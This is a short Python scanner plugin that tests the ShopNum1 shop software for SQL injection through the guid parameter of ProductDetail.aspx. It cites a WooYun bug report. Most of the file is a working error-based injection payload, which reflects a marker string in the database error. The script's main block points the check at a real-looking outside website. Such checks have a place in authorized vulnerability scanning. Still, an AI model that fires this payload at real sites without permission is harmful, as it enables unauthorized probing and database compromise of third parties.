#!/usr/bin/evn python
#--coding:utf-8--*--
#Name: shopnum1注入4
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0118447
#Author:xq17

def assign(service,arg):
    if service=="shopnum1":
        return True,arg

def audit(arg):
    payload = "ProductDetail.aspx?guid=6e1c9384-232c-4ee0-ada4-14562136d755%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--"
    url=arg+payload
    code, head, res, errcode,finalurl =  curl.curl(url)
    if code == 200 and "testXQ17" in res:
        security_hole('find sql injection: ' + arg)
        return arg


if  __name__ == '__main__':
    from dummy import *
    audit(assign("shopnum1","http://www.dapeng.net/")[1])
